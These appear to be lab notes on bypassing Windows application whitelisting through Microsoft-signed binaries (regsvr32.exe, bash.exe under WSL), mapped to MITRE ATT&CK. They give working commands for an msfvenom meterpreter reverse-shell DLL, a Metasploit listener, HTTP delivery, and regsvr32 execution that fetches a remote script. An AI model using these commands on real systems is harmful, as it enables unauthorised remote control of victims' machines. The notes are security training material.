
**Application Whitelisting** is a Microsoft endpoint security control that prevents unauthorized or malicious executables from running. It operates on a **rule-based allowlist model**, permitting only explicitly approved binaries or applications to execute.

Attackers commonly bypass this control by abusing **trusted, Microsoft-signed binaries**, a technique classified under **LOLBAS (Living Off the Land Binaries and Scripts)**.

> **MITRE ATT&CK Classification**
> 
> - **Technique:** Signed Binary Proxy Execution
>     
> - **Technique ID:** T1218 / T1202 (Indirect Command Execution)
>     

---

## Why Application Whitelisting Fails

- Relies on **trusted binaries** already present on the system
    
- Often allows execution of **signed Microsoft tools**
    
- Many LOLBAS techniques execute:
    
    - In-memory
        
    - Without dropping obvious malicious executables
        
- Reduces visibility for traditional AV/EDR detection
    

---

## LOLBAS Technique: `regsvr32.exe`

### Description

`regsvr32.exe` is a Microsoft command-line utility used to **register and unregister DLLs** in the Windows Registry.

Because it is:

- Microsoft-signed
    
- Trusted by default
    
- Capable of loading remote or local DLLs
    

…it is commonly abused to **bypass application whitelisting**.

> According to Red Canary, `regsvr32.exe` is among the **top ATT&CK techniques observed in real-world attacks**.

---

### Binary Locations

|Architecture|Path|
|---|---|
|32-bit|`C:\Windows\System32\regsvr32.exe`|
|64-bit|`C:\Windows\SysWOW64\regsvr32.exe`|

---

## Execution Flow (High-Level)

1. Generate a malicious DLL payload
    
2. Set up a listener to receive a reverse connection
    
3. Deliver the DLL to the target system
    
4. Execute the DLL using `regsvr32.exe`
    
5. Payload executes under a trusted Windows binary context
    

---

## Payload Generation (DLL)

The payload output format is explicitly set to **DLL**.

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll`

---

## Listener Setup

`msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LHOST ATTACKBOX_IP set LPORT 443 exploit`

---

## Payload Delivery

A simple HTTP server is used to host the DLL:

`python3 -m http.server 1337`

The victim retrieves the DLL via a browser or command-line tool.

---

## DLL Execution via `regsvr32.exe`

### Basic Execution

`C:\Windows\System32\regsvr32.exe C:\Users\thm\Downloads\live0fftheland.dll`

### Advanced Execution (Indirect Execution)

`C:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll`

#### Flag Breakdown

|Flag|Purpose|
|---|---|
|`/s`|Silent mode|
|`/n`|Do not call `DllRegisterServer`|
|`/i:`|Specify alternate server or script|
|`/u`|Unregister method execution|

---

## Result

- Execution occurs via a **trusted Microsoft binary**
    
- Application Whitelisting is bypassed
    
- Reverse connection is established to the listener
    

---

## Architecture Consideration

- **32-bit DLL** → Use `System32\regsvr32.exe`
    
- **64-bit DLL** → Use `SysWOW64\regsvr32.exe`
    
- Architecture mismatch will result in execution failure
    

---

## LOLBAS Technique: `bash.exe` (WSL)

### Background

Microsoft introduced **Windows Subsystem for Linux (WSL)** to support Linux environments on:

- Windows 10
    
- Windows 11
    
- Windows Server 2019+
    

`bash.exe` is a **Microsoft-signed binary** used to interact with the Linux subsystem.

---

### Abuse Scenario

Attackers can execute unsigned payloads via:

`bash.exe -c "path-to-payload"`

This allows:

- Execution of non-whitelisted binaries
    
- Indirect command execution via a trusted binary
    

> **MITRE ATT&CK:**
> 
> - **Technique ID:** T1202
>     
> - **Name:** Indirect Command Execution
>     

---

### Limitations

- WSL must be **enabled and installed**
    
- Not available in environments with:
    
    - Disabled WSL
        
    - Nested virtualization restrictions
        

---

## Key Takeaways

- Application Whitelisting can be bypassed using **trusted system binaries**
    
- LOLBAS techniques exploit:
    
    - Implicit trust
        
    - Signed Microsoft executables
        
- `regsvr32.exe` and `bash.exe` are commonly abused due to:
    
    - Native availability
        
    - Legitimate operational use
        
- Defensive controls must include **behavioral detection**, not just allowlists